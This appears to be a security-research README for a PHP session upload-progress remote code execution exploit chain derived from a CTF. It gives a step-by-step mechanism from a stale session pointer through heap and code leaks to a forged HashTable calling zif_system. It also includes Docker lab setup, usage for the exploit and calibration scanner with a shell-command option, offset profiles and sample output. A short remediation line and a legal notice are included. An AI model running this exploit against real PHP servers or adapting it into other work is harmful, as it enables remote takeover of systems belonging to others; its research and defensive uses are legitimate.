<div align="center">

# php-upload-rce

**OpenPro Security Research**

PHP `session.upload_progress` stale-pointer RCE — source analysis, calibration scanner, and profile-driven exploit chain.  
CVE-2026-109619 · PHP 8.2–8.4 · nginx → `php -S` · Apache prefork

[![Python](https://img.shields.io/badge/python-3.11%2B-3776ab?logo=python&logoColor=white)](https://python.org)
[![PHP](https://img.shields.io/badge/PHP-8.2%20%7C%208.3%20%7C%208.4-777bb4?logo=php&logoColor=white)](https://php.net)
[![CVE](https://img.shields.io/badge/CVE--2026--109619-CVSS%209.2-critical)](https://nvd.nist.gov)
[![License](https://img.shields.io/badge/license-MIT-blue)](LICENSE)
[![Publisher](https://img.shields.io/badge/OpenPro-Security%20Research-0066cc)](https://openpro.ai)

</div>

---

## What this is

PHP's multipart parser fires the session upload-progress callback **before** module `RINIT` runs. When an OOM occurs at that point, `PS(id)` — the session-ID pointer — is left dangling in the worker. The next request can forge a fake `zend_string` header over that address, making PHP write a multi-kilobyte heap+code leak into a `Set-Cookie` header. From those two pointers a forged `HashTable` with `pDestructor = zif_system` achieves RCE.

**Full chain** (nginx → `php -S`, 20 HTTP requests, stdlib-only Python):

```
OOM producer  →  heap leak (256-byte PHPSESSID)
              →  code leak (16-byte PHPSESSID)
              →  forged HashTable → zif_system(cmd)
```

## Contents

| | |
|---|---|
| `lab/exploit.py` | Profile-driven exploit — add a `PROFILES` entry, point at target |
| `tools/scanner.py` | Calibration scanner — auto-finds OOM depth, consumer shapes, pointer fingerprints |
| `docs/05-ps-id-stale-pointer.md` | Source-level analysis of the PS(id) survival mechanism |
| `docs/06-cli-rce-chain.md` | Full nginx → php -S RCE chain walkthrough |
| `docs/01-mechanism.md` | BG(serialize) path (CVE-2026-109618) |
| `REMEDIATION.md` | One-line fix, detection, hardening |

---

## Quick start

### Lab (Docker, 60 seconds)

```bash
# 1. Stand up Alpine PHP 8.4.26 behind nginx
mkdir lab && cd lab
cat > nginx.conf << 'EOF'
events {}
http { server { listen 80; location / { proxy_pass http://ctf-php:8000; proxy_http_version 1.1; proxy_set_header Host $host; } } }
EOF
mkdir public
echo '<?php header("Content-Type: text/plain"); echo "PHP ", PHP_VERSION, "\nPID: ", getmypid(), "\n";' > public/php-version.php
printf '#!/bin/sh\necho "flag{demo}"\n' > print-flag && chmod +x print-flag

docker network create lab-net
docker run -d --name ctf-php --network lab-net --memory 128m \
  -e PHP_CLI_SERVER_WORKERS=4 \
  -v "$PWD/public:/app:ro" -v "$PWD/print-flag:/usr/local/bin/print-flag:ro" \
  php:8.4.26-fpm-alpine3.23 php -S 0.0.0.0:8000 -t /app
docker run -d --name ctf-nginx --network lab-net -p 127.0.0.1:18166:80 \
  -v "$PWD/nginx.conf:/etc/nginx/nginx.conf:ro" nginx:1.27-alpine

# 2. Run the exploit
python3 lab/exploit.py --url http://127.0.0.1:18166/php-version.php
```

Expected output:

```
 ╔══════════════════════════════════════════════════╗
 ║  OpenPro · php-upload-rce                        ║
 ║  CVE-2026-109619 · PHP session.upload_progress   ║
 ╚══════════════════════════════════════════════════╝

 [✓] health     PHP/8.4.26 confirmed
 [✓] heap       Zend base 0x78113e800000
 [✓] code       zval_ptr_dtor 0x615b1f512930
 [✓] callback   execution verified

{"stage":"final","nonce":"1ef0e73d","execution_proof_verified":true}
```

### Tear down

```bash
docker rm -f ctf-nginx ctf-php && docker network rm lab-net
```

---

## Exploit usage

```
python3 lab/exploit.py --url URL [options]

Options:
  --url URL           Target version endpoint (loopback or stealmybitcoin.com)
  --profile PROFILE   Calibration profile (default: alpine-8.4.26)
  --cmd CMD           Shell command to run (default: proof nonce + id + print-flag)
  --workers N         Pipelined consumers per leak stage (default: 8)
  --retries N         Full-chain attempts before giving up (default: 3)
  --output-dir DIR    Write raw HTTP evidence here (default: exploit-run-<timestamp>)
```

### Add a new profile

Run the scanner (below), fill in the two locally-measured offsets, add to `PROFILES` in `lab/exploit.py`:

```python
PROFILES["debian-8.4.26"] = {
    "dtor_low21":    0x1XXXXX,   # from scanner
    "zif_system_from_dtor": -0xYYYYYY,  # nm php | grep zif_system vs zval_ptr_dtor
    "heap_carrier_delta":    0xZZZZZZZ,  # GDB local run (see docs/06-cli-rce-chain.md)
    "heap_carrier_offset":   0xAAAAAA,   # GDB local run
    "heap_producer":    {"depth": 57, "count": 950, "field_count": 50, "field_value_size": 1},
    "code_producer":    {"depth": 58, "count": 935, "field_count": 65, "field_value_size": 39},
    "php_version_header":   "PHP/8.4.26",
    "php_version_body_prefix": b"PHP 8.4.26\n",
    "heap_min":    0x700000000000,
    "heap_max":    0x800000000000,
    "code_min":    0x500000000000,
    "code_max":    0x700000000000,
}
```

---

## Scanner usage

```
python3 tools/scanner.py --url URL [options]

Options:
  --url URL              Target version endpoint
  --allow-remote         Required for non-loopback targets
  --local-binary PATH    PHP binary to read nm offsets from
  --output-dir DIR       Write probe results here
  --workers N            Consumers per sweep attempt (default: 4)
  --delay SECS           Pause between requests (default: 0.5)
  --max-body BYTES       Request size cap (default: 950000)
```

The scanner runs five phases and prints a ready-to-paste `PROFILES` entry:

```
 ╔══════════════════════════════════════════════════╗
 ║  OpenPro · php-upload-rce  /  scanner            ║
 ║  CVE-2026-109619 calibration probe               ║
 ╚══════════════════════════════════════════════════╝

 Phase 0  fingerprint
 [✓] version    PHP/8.4.26
 [✓] oom-probe  triggered

 Phase 1  OOM sweep
 [·] probe      (1/30) depth=54 count=925 → oom=False
 [✓] oom        depth=57 count=950 body=249042B

 Phase 2  heap consumer sweep
 [✓] heap       n_small=51 forge_len=256 base=0x78113e800000

 Phase 3  code consumer sweep
 [✓] code       n_small=73 arr_idx=69 dtor=0x615b1f512930 low21=0x112930

 Phase 4  calibration
 ────────────────────────────────────────────────────────
  Paste into PROFILES in lab/exploit.py:

  PROFILES["scanned-php-8-4-26"] = {
      "dtor_low21":          0x112930,
      "zif_system_from_dtor": None,  # measure with --local-binary
      ...
  }
 ────────────────────────────────────────────────────────
```

### Compute nm offsets locally

```bash
python3 tools/scanner.py --local-binary /usr/local/bin/php
```

Output:

```
[nm] zval_ptr_dtor  0x...
[nm] zif_system     0x...
[nm] zif_from_dtor  -0x204BC0
```

---

## How it works

See `docs/05-ps-id-stale-pointer.md` for the complete source walkthrough. Short version:

1. **Pre-RINIT window**: `php_hash_environment()` (line 1873 of `main.c`) runs the multipart parser and fires the RFC1867 callback. `zend_activate_modules()` (line 1874) runs module RINIT. The gap between these two lines is where session state can be half-built.

2. **OOM trigger**: A specially-shaped multipart body causes `smart_string_appendc` inside `php_session_send_cookie()` to hit the memory limit with a fixed 4096-byte allocation. The `longjmp` skips cleanup.

3. **Why the pointer survives**: `PG(modules_activated) == 0` at OOM time, so `php_request_shutdown()` skips all module RSHUTDOWNs including session's. `php_rshutdown_session_globals()` never runs. `PS(id)` stays non-null across requests.

4. **Leak**: The next request forges a `zend_string` length field over the stale pointer, making `php_session_send_cookie()` emit controlled amounts of heap data as a URL-encoded `PHPSESSID` cookie.

5. **RCE**: With heap base + code pointer, a forged `HashTable` at a calculated address points `pDestructor` at `zif_system`. PHP's cleanup path calls it with the supplied command string.

---

## Affected versions

| Branch | Last vulnerable | Fixed |
|---|---|---|
| PHP 8.4 | 8.4.26 | 8.4.27 |
| PHP 8.3 | 8.3.35 | 8.3.36 |
| PHP 8.2 | 8.2.34 | 8.2.35 |

---

## Fix

```ini
; php.ini — one line, no code changes required
session.upload_progress.enabled = Off
```

Full guidance: **[REMEDIATION.md](REMEDIATION.md)**

---

## Evidence

The `docs/` chain records what was independently verified vs. what was reasoned from source. Raw HTTP request/response pairs are written to the output directory by each tool run.

---

## Legal

Run only against systems you own or have explicit written permission to test.  
This tool is gated: `--allow-remote` is required for non-loopback targets; the exploit refuses non-loopback or non-challenge URLs without it.

---

## Credits

- **KillaBoi** — first public solve of the StealMyBitcoin CTF (2026-10-25); original exploit chain
- **LiveOverflow / hextree.io** — challenge design and helpful comms with the solver
- **OpenPro / Rémi Pelloux** — independent source-level analysis of the `PG(modules_activated)` gate, calibration scanner, and documentation

---

<div align="center">

**[OpenPro](https://openpro.ai)** · Security Research · 2026  
MIT License — see [LICENSE](LICENSE)

</div>
